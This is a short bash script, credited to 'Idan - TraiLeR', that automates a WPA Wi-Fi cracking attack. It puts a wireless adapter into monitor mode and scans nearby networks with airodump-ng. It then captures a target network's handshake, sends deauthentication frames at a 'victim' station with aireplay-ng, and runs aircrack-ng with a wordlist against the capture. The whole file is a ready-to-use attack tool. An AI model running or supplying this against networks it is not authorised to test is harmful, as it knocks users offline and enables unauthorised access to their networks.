#!/bin/bash

echo -e		"______________________________________________________________________________________________________________________________________________________________________ $RESET"
echo -e		"																					$RESET"
echo -e 	"																					$RESET"
echo -e 	"					   		* The Tool Created By Idan - TraiLeR * "
echo -e 	"																					$RESET"
echo -e 	"______________________________________________________________________________________________________________________________________________________________________ $RESET"

echo -e "Starting Wi-Fi Attack"
echo -e " "
read -p "Enter your adapter's name: " name
echo -e " "
read -p "Checking if There are Any Problematic PPID......................... (Press Enter)"
command kill all
echo -e " "
echo -e "All PPID have been deleted"
echo -e " "
echo -e "Let's enable monitor mode!"
command ifconfig $name down && iwconfig $name mode monitor && ifconfig $name up
sleep 3
echo -e "Mode monitor in "$name "has changed sucessfully!"
echo -e " "
echo -e "Press CTRL + C When you Finish the SCAN! *IMPORTANT* :"
sleep 5
command airodump-ng $name
echo -e " "
echo -e " "
read -p "Enter Bssid Name: " BssidName
echo -e " "
read -p "Enter Channel: " Channel
echo -e " "
read -p "Enter Bssid: " Bssid
echo -e " "
gnome-terminal -- airodump-ng -c $Channel --bssid $Bssid $name -w /root/Desktop/$BssidName
echo -e " "
echo -e "PCAP file saved in /root/Desktop"
echo -e " "
read -p "Enter Number of Attacks (10-100): " attacks
echo -e " "
read -p "Enter Bssid: " bssid2
echo -e " "
read -p "Enter Victim's Station: " victim
command aireplay-ng --deauth $attacks -a $bssid2 -c $victim $name
echo -e " "
sleep 5
read -p "Enter PCAP File Path:" path
echo -e " "
read -p "Enter Wordlist Path:" path2
command aircrack-ng -w $path2 $path
echo -e " "
read -p "Press Enter To Finish" finish
choice=1000
